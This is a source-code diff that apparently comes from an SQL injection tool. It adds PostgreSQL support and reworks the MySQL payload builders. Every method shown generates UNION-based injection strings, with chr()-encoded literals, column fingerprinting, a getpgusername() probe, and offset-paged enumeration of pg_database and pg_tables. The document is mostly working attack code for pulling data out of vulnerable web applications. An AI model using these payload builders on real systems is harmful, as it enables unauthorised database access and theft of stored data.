@@ -25,9 +25,14 @@
 import re
 
 class DbmsMole():
+    field_finger_str = 'The_Mole.F1nger!'
     error_strings = [
                         "Error: Unknown column '(\d*)' in 'order clause'"
                     ]
+    
+    @classmethod
+    def injectable_field_finger(cls, query_columns, base):
+        pass
     
     @classmethod
     def dbms_check_query(cls, columns, injectable_field):
@@ -41,17 +46,12 @@ class DbmsMole():
         return '0x' + output
 
     @classmethod
-    def injectable_field_finger(cls, query_columns, base):
-        hashes = []
-        to_search = []
-        for i in range(0, query_columns):
-            hashes.append(DbmsMole.to_hex(str(base + i)))
-            to_search.append(str(base + i))
-        return (hashes, to_search)
+    def chr_join(cls, string):
+        return '||'.join(map(lambda x: 'chr(' + str(ord(x)) + ')', string))
     
     @classmethod
     def field_finger(cls):
-        pass
+        return DbmsMole.field_finger_str
         
     @classmethod
     def dbms_name(cls):
@@ -69,7 +69,6 @@ class Mysql5Mole(DbmsMole):
     out_delimiter = DbmsMole.to_hex(out_delimiter_result)
     inner_delimiter_result = "><"
     inner_delimiter = DbmsMole.to_hex(inner_delimiter_result)
-    field_finger_str = 'The_Mole.mysqlfinger!'
 
     @classmethod
     def parse_condition(self, condition):
@@ -80,12 +79,17 @@ class Mysql5Mole(DbmsMole):
         return ''.join(cond)
     
     @classmethod
-    def dbms_name(cls):
-        return 'Mysql 5'
+    def injectable_field_finger(cls, query_columns, base):
+        hashes = []
+        to_search = []
+        for i in range(0, query_columns):
+            hashes.append(DbmsMole.to_hex(str(base + i)))
+            to_search.append(str(base + i))
+        return (hashes, to_search)
     
     @classmethod
-    def field_finger(cls):
-        return Mysql5Mole.field_finger_str
+    def dbms_name(cls):
+        return 'Mysql 5'
     
     @classmethod
     def blind_field_delimiter(cls):
@@ -95,7 +99,7 @@ class Mysql5Mole(DbmsMole):
     def field_finger_query(cls, columns, injectable_field):
         query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(columns)))
-        query_list[injectable_field] = DbmsMole.to_hex(Mysql5Mole.field_finger_str)
+        query_list[injectable_field] = DbmsMole.to_hex(DbmsMole.field_finger_str)
         query += ",".join(query_list) + " {com}"
         return query
     
@@ -310,28 +314,94 @@ class Mysql5Mole(DbmsMole):
         return "Mysql 5 Mole"
 
 class PostgresMole(DbmsMole):
+    out_delimiter_result = "::-::"
+    out_delimiter = DbmsMole.chr_join(out_delimiter_result)
+    inner_delimiter_result = "><"
+    inner_delimiter = DbmsMole.chr_join(inner_delimiter_result)
     
     @classmethod
-    def dbms_check_query(cls, columns, injectable_field):
+    def dbms_name(cls):
+        return 'Postgres'
+    
+    @classmethod
+    def parse_condition(self, condition):
+        cond = condition.split("'")
+        for i in range(len(cond)):
+            if i % 2 == 1:
+                cond[i] = "(" + DbmsMole.chr_join(cond[i]) + ")::unknown"
+        return ''.join(cond)
+    
+    @classmethod
+    def forge_query(cls, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
-        query += ','.join(map(lambda x: 'chr({0})::unknown'.format(''), map(str, range(columns)))).replace(
-            str(injectable_field),
-            "@@version",
-            1
-        )
-        query += " {com}"
+        query_list = []
+        for i in range(column_count):
+            query_list.append('(' + DbmsMole.chr_join(str(i)) + ')::unknown')
+        query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||(" +
+                                            ('||' + PostgresMole.inner_delimiter + '||').join(fields.split(',')) +
+                                            ")||" + PostgresMole.out_delimiter + ")"
+                                        )
+        query += ','.join(query_list)
+        query += " from " + table_name + " where " + PostgresMole.parse_condition(where) + \
+                 " limit 1 offset " + str(offset) + "{com}"
+        return query
+    
+    @classmethod
+    def injectable_field_finger(cls, query_columns, base):
+        hashes = []
+        to_search = []
+        for i in range(query_columns):
+            hashes.append('(' + DbmsMole.chr_join(str(base + i)) + ')::unknown')
+            to_search.append(str(base + i))
+        return (hashes, to_search)
+    
+    @classmethod
+    def field_finger_query(cls, columns, injectable_field):
+        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
+        query_list = []
+        for i in range(columns):
+            query_list.append('(' + DbmsMole.chr_join(str(i)) + ')::unknown')
+        query_list[injectable_field] = "(" + DbmsMole.chr_join(DbmsMole.field_finger_str) + ")::unknown"
+        query += ",".join(query_list) + " {com}"
         return query
 
     @classmethod
     def dbms_check_query(cls, columns, injectable_field):
-        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
-        query += ','.join(map(str, range(columns))).replace(
-            str(injectable_field),
-            "getpgusername()",
-            1
+        return PostgresMole.forge_query(
+            columns, 'getpgusername()', 'pg_user', injectable_field
         )
-        query += " {com}"
-        return query
+    
+    @classmethod
+    def schema_count_query(cls, columns, injectable_field):
+        return PostgresMole.forge_query(columns, "count(*)", 
+               "pg_catalog.pg_database", injectable_field, offset=0)
+               
+    @classmethod
+    def schema_query(cls, columns, injectable_field, offset):
+        return PostgresMole.forge_query(columns, "datname", 
+               "pg_catalog.pg_database", injectable_field, offset=offset)
+               
+    @classmethod
+    def table_count_query(cls, db, columns, injectable_field):
+        return PostgresMole.forge_query(columns, "count(*)", 
+                    "pg_catalog.pg_tables", injectable_field,
+                    "schemaname = " + DbmsMole.chr_join(db),
+               )
+
+    @classmethod
+    def table_query(cls, db, columns, injectable_field, offset):
+        return PostgresMole.forge_query(columns, "tablename", 
+                    "pg_catalog.pg_tables", injectable_field,
+                    "schemaname = " + DbmsMole.chr_join(db), offset=offset
+               )
+
+    @classmethod
+    def parse_results(cls, url_data):
+        data_list = url_data.split(PostgresMole.out_delimiter_result)
+        if len(data_list) < 3:
+            return None
+        data = data_list[1]
+        return data.split(PostgresMole.inner_delimiter_result)
     
     def __str__(self):
         return "Posgresql Mole"
